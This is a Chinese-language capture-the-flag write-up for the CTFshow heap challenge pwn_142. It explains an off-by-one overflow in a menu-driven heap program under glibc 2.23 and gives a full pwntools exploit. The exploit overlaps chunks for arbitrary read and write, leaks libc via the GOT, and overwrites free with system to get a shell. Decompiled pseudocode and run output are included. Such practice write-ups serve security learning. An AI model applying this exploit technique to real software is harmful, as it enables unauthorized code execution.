# CTFshow-pwn_142
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 堆利用（fastbin-off_by_one）
## 解题思路
> 利用 off_by_one 延展堆块

仅没有 PIE 保护，部分 RELRO，本地libc使用 2.23-0ubuntu11.3_amd64

```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn_142
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ./pwn_142
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_142
[*] '/home/mrw/CTFshow/pwn_142'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'
    Stripped:   No
```


- 从伪代码分析，每个 heap 由头部 chunk 和 内容 chunk 组成：头部 chunk 数据空间占16字节，前8字节存储内容长度，后8字节存储内容 chunk 地址；内容 chunk 长度可控数据空间存放输入内容。整个程序支持增改查删，没有 UAF 和未使用的后门函数，但在 edit_heap 函数中存在一个明显的 off_by_one 堆溢出，若能申请一个长度为8的整数倍的 chunk，使之数据空间同下一个 chunk 的 prev_size 区域重叠，就能通过 off_by_one 修改下一个堆块的 size 的最小字节  
- 可以先申请三个 heap，其中第一个 heap 内容 chunk 要求长度为8的奇数倍，随后 off_by_one 修改第二个 heap 头部 chunk 的 size，满足既符合 fastbin 要求又可以覆盖掉第三个 heap 头部 chunk，最后通过申请 heap 覆盖第三个 heap 头部 chunk 中的内容长度及内容地址，此后 show/edit 第三个 heap 就能实现任意读写。若需修改任意读写的位置仅需 edit 第二个heap 即可
- 实现任意读写后，泄露 puts 的 got 表中存储的实际地址，计算得到 libc 基址，计算 system 实际地址，最后修改 free got 表为 system 的实际地址，最后申请第四个 heap 并填入命令即可实现 RCE。
- **注意：一定要先修改 chunk 的 size 再 free，若顺序相反会导致从 fastbin 分配时的 size 效验不通过而触发 SIGABRT**

**exp 如下**  
```python
from pwn import *
p = process('./pwn_142')
libc = ELF('/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
gdb.attach(p)
# 与程序沟通
def add_heap(siz, content):
  p.sendafter(b'Your choice :', b'1')
  p.sendafter(b'Size of Heap : ', str(siz).encode())
  p.sendafter(b'Content of heap:', content)

def edit_heap(index, content):
  p.sendafter(b'Your choice :', b'2')
  p.sendafter(b'Index :', str(index).encode())
  p.sendafter(b'Content of heap : ', content)

def show_heap(index):
  p.sendafter(b'Your choice :', b'3')
  p.sendafter(b'Index :', str(index).encode())

def del_heap(index):
  p.sendafter(b'Your choice :', b'4')
  p.sendafter(b'Index :', str(index).encode())

# 制造任意读写
add_heap(0x18, b'a') # heap 0
add_heap(0x20, b'b') # heap 1
add_heap(0x10, b'c') # heap 2
edit_heap(0,b'a'*0x18 + b'\x71') # off_by_one 修改空闲堆块长度
del_heap(1) # del heap 1
add_heap(0x60, b'a' * 0x40 + p64(0) + p64(0x20) + p64(0x10) + p64(0x602028)) # 伪造 heap 2 头部指向 puts 的 got 表

# 获取 libc 基址
show_heap(2)
p.recvuntil(b'Content : ')
raw = p.recvuntil(b'Done !')
print(raw)
puts_addr = u64(raw[:-7].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
print(f'libc_base is {libc_base : x}')

# 修改 got 表
edit_heap(1, b'a' * 0x40 + p64(0) + p64(0x20) + p64(0x10) + p64(0x602018)) # 伪造 heap 2 头部指向 free 的 got 表
system_addr = libc_base + libc.symbols['system']
edit_heap(2, p64(system_addr))

# 提权
add_heap(0x10, b'/bin/sh\x00') # heap 3
del_heap(3) # system("/bin/sh")
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_142.py
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_142.py
[+] Starting local process './pwn_142': pid 13353
[*] '/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_142', '-p', '13353']
[+] Waiting for debugger: Done
b'\xa0\xf6\x86\x04\x01y\nDone !'
libc_base is  790104800000
[*] Switching to interactive mode
$ ls /
bin		   dev	 lib32		    media  run		       swap.img
bin.usr-is-merged  etc	 lib64		    mnt    sbin		       sys
boot		   flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom		   home  libx32		    proc   snap		       usr
ctfshow_flag	   lib	 lost+found	    root   srv		       var
$ cat /ctfshow_flag
flag{Success!}
$  
```

## 反编译后伪代码中有用的部分

反编译得到的有用的伪代码如下  
```c
ssize_t __fastcall read_input(void *a1, size_t a2)
{
  ssize_t result; // rax

  result = read(0, a1, a2);
  if ( (int)result <= 0 )
  {
    puts("Error");
    _exit(-1);
  }
  return result;
}
int menu()
{
  puts("--------------------------------");
  puts("          Heap Creator          ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Show a Heap                 ");
  puts(" 4. Delete a Heap               ");
  puts(" 5. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
unsigned __int64 create_heap()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*((_QWORD *)&heaparray + i) )
    {
      *((_QWORD *)&heaparray + i) = malloc(0x10uLL);
      if ( !*((_QWORD *)&heaparray + i) )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      v0 = *((_QWORD *)&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      if ( !*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL) )
      {
        puts("Allocate Error");
        exit(2);
      }
      **((_QWORD **)&heaparray + i) = size;
      printf("Content of heap:");
      read_input(*(void **)(*((_QWORD *)&heaparray + i) + 8LL), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
unsigned __int64 edit_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( (unsigned int)v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf("Content of heap : ");
    read_input(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
unsigned __int64 show_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( (unsigned int)v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf(
      "Size : %ld\nContent : %s\n",
      **((_QWORD **)&heaparray + v1),
      *(const char **)(*((_QWORD *)&heaparray + v1) + 8LL));
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
unsigned __int64 delete_heap()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( (unsigned int)v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    free(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL));
    free(*((void **)&heaparray + v1));
    *((_QWORD *)&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  while ( 1 )
  {
    menu();
    read(0, buf, 4uLL);
    switch ( atoi(buf) )
    {
      case 1:
        create_heap();
        break;
      case 2:
        edit_heap();
        break;
      case 3:
        show_heap();
        break;
      case 4:
        delete_heap();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid Choice");
        break;
    }
  }
}
```
